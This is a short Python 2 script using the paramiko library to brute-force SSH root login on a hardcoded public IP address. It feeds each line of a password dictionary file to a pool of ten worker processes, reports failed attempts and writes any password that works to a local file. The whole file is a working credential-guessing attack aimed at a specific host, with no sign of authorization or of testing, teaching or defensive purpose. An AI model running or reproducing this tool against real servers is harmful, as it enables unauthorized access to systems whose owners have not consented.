# coding: utf-8
from multiprocessing.pool import ThreadPool, Pool

import paramiko


def check_ssh(host, port, user, password):
    client = paramiko.SSHClient()
    try:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port, username=user, password=password)
        print(10**100)
        print(repr(password))
        with open('/Users/a0x55aa/aa.txt', 'w') as f:
            f.write(password)
        client.close()
    except Exception, e:
        if e[0] == 'Authentication failed.':
            print("login fail {}!".format(password))
        else:
            print(e)
            print("connect fail {}:{}".format(host, port))


# tpool = ThreadPool(10)
tpool = Pool(10)
with open("/Users/a0x55aa/tmp/password-dictionaries/dictionaries/unix-fresh-scanner.txt") as f:
    for l in f:
        print(1)
        tpool.apply_async(check_ssh, ("114.55.176.50", 22, 'root', l.strip()))
        # tpool.apply(check_ssh, ("114.55.176.50", 22, 'root', l.strip()))
